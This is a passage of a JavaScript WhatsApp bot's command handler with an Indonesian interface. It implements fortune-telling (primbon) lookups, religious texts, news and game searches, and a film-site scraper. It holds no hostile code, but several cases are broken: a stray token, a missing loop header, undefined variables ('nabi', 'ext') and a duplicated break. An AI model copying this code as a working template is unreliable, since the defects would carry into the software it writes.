    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttons,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
}
searchgc
break
case 'quotesanime': case 'quoteanime': {
 
    if (isBan) return reply(mess.banned)
    	if (checklimitUser(sender) <= 0) return reply(limitabis) 
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
footer: `© ${setting.botName} bot`,
    buttons: buttons,
    headerType: 2
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
}
confirmlimit(sender, 1)
break
case 'nomerhoki': case 'nomorhoki': {
  
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!Number(text)) return reply( `Example : ${prefix + command} 6288292029179`)
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
confirmlimit(sender, 1)
break
case 'artimimpi': case 'tafsirmimpi': {
  
    if (isBan) return reply(mess.banned)
if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
confirmlimit(sender, 1)
break
case 'ramalanjodoh': case 'ramaljodoh': {

    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'ramalanjodohbali': case 'ramaljodohbali': {

    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'suamiistri': {
    
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'ramalancinta': case 'ramalcinta': {

    if (isBan) return reply(mess.banned)
if ( checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'artinama': {
    
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'kecocokannama': case 'cocoknama': {

    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
confirmlimit(sender, 1)
break
case 'ship':
  
    if (isBan) return reply(mess.banned)
  if (args.length < 1) return reply(`Masukan Query Pasangan\nContoh:\n${prefix}ship Hilmi&CeptiBot`)
var lan1 = q.split("&")[0];
var lan2 = q.split("&")[1];
 const shi =['0','4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
 const peh = shi[Math.floor(Math.random() * shi.length)]
   hasil = `Nih Liat persen ${lan1} dan ${lan2} \n\n==============\n♥️: ${peh} %\n==============`
  reply(hasil)
break
case 'tagme':

    if (isBan) return reply(mess.banned)
    reply(`@${sender.split("@")[0]}`)
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
  
    if (isBan) return reply(mess.banned)
if ( checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
Cepti.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
confirmlimit(sender, 1)
break
case 'jadianpernikahan': case 'jadiannikah': {
 
    if (isBan) return reply(mess.banned)
   if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
confirmlimit(sender, 1)
break
case 'sifatusaha': {

    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!ext)return reply( `Example : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
confirmlimit(sender, 1)
break
case 'rejeki': case 'rezeki': {
  
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'pekerjaan': case 'kerja': {
   
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
 
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
   if (!text) return reply( `Example : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
confirmlimit(sender, 1)
break
case 'potensipenyakit': case 'penyakit': {
 
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'artitarot': case 'tarot': {

    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'fengshui': {

    if (isBan) return reply(mess.banned)
   if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
confirmlimit(sender, 1)
break
case 'haribaik': {
  
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'harisangar': case 'taliwangke': {
 
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'harinaas': case 'harisial': {

    if (isBan) return reply(mess.banned)
 if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
confirmlimit(sender, 1)
break
case 'nagahari': case 'harinaga': {

    if (isBan) return reply(mess.banned)
if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'arahrejeki': case 'arahrezeki': {

    if (isBan) return reply(mess.banned)
   if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'peruntungan': {
 
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'weton': case 'wetonjawa': {
 
    if (isBan) return reply(mess.banned)
   if ( checklimitUser(sender) <= 0) return reply(limitabis)   
if (!text) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
confirmlimit(sender, 1)
break
/// wajib ganti github ya
case 'asmaulhusna': {
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/religi/asmaulhusna.json')
let capt = `Asmaul Husna:\n\n`
{
capt += `❏ *Nomor*: ${i.index}\n`
capt += `❏ *Latin*: ${i.latin}\n`
capt += `❏ *Arab*: ${i.arabic}\n`
capt += `❏ *Arti ID*: ${i.translation_id}\n`
capt += `❏ *Arti EN*: ${i.translation_en}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n`
}
m.reply(capt)
}
break
///belum di tambahkan list fitur
////ceramah para ustaz
case 'ceramah': {
if (!text) return m.reply(`Mau Ceramah Dari Siapa?\n\nList Ustadz :\n1. abdulsomad\n2. adihidayat\n3. felixsiauw\n4. khalidbasalamah\n\nExample: ${prefix+command} abdulsomad`)
var tipe = (args[0] || '').toLowerCase()
switch (tipe) {
case 'abdulsomad': case 'adihidayat': case 'felixsiauw': case 'khalidbasalamah': 
m.reply(mess.wait)
let ceramah = await fetchJson(`https://raw.githubusercontent.com/CeptiRest/tempatfitur/main/${text}.json`)
let rescera = `Ceramah Dari *${ceramah.name}*

${ceramah.ceramah}`
m.reply(rescera)
}
}
break
case 'kisahnabi': {
if (!text) return m.reply(`Mau Kisah Nabi Siapa?\n\nList Nama Nabi :\n1. adam\n2. idris\n3. nuh\n4. hud\n5. saleh\n6. ibrahim\n7. luth\n8. ismail\n9. ishaq\n10. yaqub\n11. yusuf\n12. ayub\n13. syuaib\n14. musa\n15. harun\n16. dzulkifli\n17. daud\n18. sulaiman\n19. ilyas\n20. ilyasa\n21. yunus\n22. zakaria\n23. yahya\n24. musa\n25. muhammad\n\nExample: ${prefix+command} Muhammad`)
var tipe = (args[0] || '').toLowerCase()
switch (tipe) {
case 'adam': case 'idris': case 'nuh': case 'hud': case 'saleh': case 'ibrahim': case 'luth': case 'ismail': case 'ishaq': case 'yaqub': case 'yusuf': case 'ayub': case 'syuaib': case 'musa': case 'harun': case 'dzulkifli': case 'daud': case 'sulaiman': case 'ilyas': case 'ilyasa': case 'yunus': case 'zakaria': case 'yahya': case 'musa': case 'muhammad': 
m.reply(mess.wait)
let kisah = await fetchJson(`https://raw.githubusercontent.com/CeptiRest/Restapi/main/${nabi}.json`)
resNabi = `Kisah Nabi ${text}

❏ *Nama* : ${kisah.name}
❏ *Kelahiran* : ${kisah.thn_kelahiran}
❏ *Usia* : ${kisah.usia}
❏ *Tempat* : ${kisah.tmp}
❏ *Cerita* : ${kisah.description}
`
Cepti.sendMessage(m.chat, { image: { url: `${kisah.image_url}` }, caption: resNabi }, { quoted: m })
 }
}
break
case 'sifat': case 'karakter': {
  
    if (isBan) return reply(mess.banned)
   if (checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
confirmlimit(sender, 1)
break
case 'keberuntungan': {
 
    if (isBan) return reply(mess.banned)
   if (checklimitUser(sender) <= 0) return reply(limitabis)    
if (!text) return reply( `Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
confirmlimit(sender, 1)
break
case 'memancing': {
   
    if (isBan) return reply(mess.banned)
    if (checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix + command} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'masasubur': {

    if (isBan) return reply(mess.banned)
    if (checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'zodiak': case 'zodiac': {
  
    if (isBan) return reply(mess.banned)
    if (checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix+ command} 7 7 2005`)
let zodiak = [
    ["capricorn", new Date(1970, 0, 1)],
    ["aquarius", new Date(1970, 0, 20)],
    ["pisces", new Date(1970, 1, 19)],
    ["aries", new Date(1970, 2, 21)],
    ["taurus", new Date(1970, 3, 21)],
    ["gemini", new Date(1970, 4, 21)],
    ["cancer", new Date(1970, 5, 22)],
    ["leo", new Date(1970, 6, 23)],
    ["virgo", new Date(1970, 7, 23)],
    ["libra", new Date(1970, 8, 23)],
    ["scorpio", new Date(1970, 9, 23)],
    ["sagittarius", new Date(1970, 10, 22)],
    ["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
    let d = new Date(1970, month - 1, day)
    return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
confirmlimit(sender, 1)
break
case 'shio': {

    if (isBan) return reply(mess.banned) 
    if (checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
Cepti.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}

break
  break
case 'mcpedl': {
  
    if (isBan) return reply(mess.banned)
if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!args.join(" ")) return reply(`Example : ${prefix + command} shader`)
yogipw.mcpedl(args.join(" ")).then(async(res) => {
teks = `*| MCPEDL SEARCH |*`
for (let i of res) {
teks += `\n\nName : ${i.name}\nCategory : ${i.category}\nDate : ${i.date}\nDesc : ${i.desc}\nLink : ${i.link}`
}
const buttonsek = [
{buttonId: `${prefix}menu`, buttonText: {displayText: '⋮☰ MENU'}, type: 1}
]
const padi = {
text: teks,
footer: `© ${setting.botName} bot`,
buttons: buttonsek,
headerType: 1
}
Cepti.sendMessage(from, padi, {quoted:ftex})
})
}
confirmlimit(sender, 1)
break
  case 'happymod': {
    
    if (isBan) return reply(mess.banned)
if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!args.join(" ")) return reply(`Example : ${prefix + command} mobile legend`)
yogipw.happymod(args.join(" ")).then(async(res) => {
teks = '「 HappyMod Search 」'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}`
}
const buttonsc = [
{buttonId: `${prefix}menu`, buttonText: {displayText: '⋮☰ MENU'}, type: 1}
]
const nhk = {
text: teks,
footer: `© ${setting.botName} bot`,
buttons: buttonsc,
headerType: 1
}
Cepti.sendMessage(from, nhk, {quoted:ftex})
})
}
confirmlimit(sender, 1)
break
case 'servermc': {
  
    if (isBan) return reply(mess.banned)
yogipw.servermc().then(async(res) => {
let teks = '*| SERVER MC INDONESIA |*\n\nhttps://minecraftpocket-servers.com/country/indonesia/\n\n'
let no = 1
for (let i of res) {
teks += `▸ Server Ke ${no++}\nip : ${i.ip}\nport : ${i.port}\nversi : ${i.versi}\nplayer : ${i.player}\n\n`
}
    const buttons = [
{buttonId: `${prefix}menu`, buttonText: {displayText: '⋮☰ MENU'}, type: 1}
]
const pa = {
text: teks,
footer: `© ${setting.botName} bot`,
buttons: buttons,
headerType: 1
}
Cepti.sendMessage(from, pa, {quoted:ftex})
})
}
break
case 'searchgc': {
  
  if ( checklimitUser(sender) <= 0) return reply(limitabis) 
    if (isBan) return reply(mess.banned)
if (args.length < 1) return reply(`Example :\n${prefix}searchgc Wibu`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks = '「 SEARCH GROUP 」'
for (let i of res) {
teks += `\n\n•> Group Whatsapp :\n`
teks += `${i.link}\n`
teks += `${i.nama}`
}
const buttonsne = [
{buttonId: `${prefix}menu`, buttonText: {displayText: '⋮☰ MENU'}, type: 1}
]
const pabr = {
text: teks,
footer: `© ${setting.botName} bot`,
buttons: buttonsne,
headerType: 1
}
Cepti.sendMessage(from, pabr, {quoted:ftex})
})
}
confirmlimit(sender, 1)
break
case 'darkjokes':
  
    if (isBan) return reply(mess.banned)
var res = await Darkjokes()
teks = "\n*Darkjokes*"
Cepti.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })
break
 case 'cnn-news':
   
    if (isBan) return reply(mess.banned)
CNNNews().then(res => {
no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
reply(teks) 
})

break
case 'layarkaca-search':
  
    if (isBan) return reply(mess.banned)
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = "=============="
for (let i of res) {
  no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += `==============`
reply(teks) 
})

break
case 'cnbc-news':
  
    if (isBan) return reply(mess.banned)
CNBCNews().then(async(res) => {
no = 0
teks = "=============="
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "=============="
Cepti.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break
case 'tribun-news':
  
    if (isBan) return reply(mess.banned)
TribunNews().then(async(res) => {
no = 0
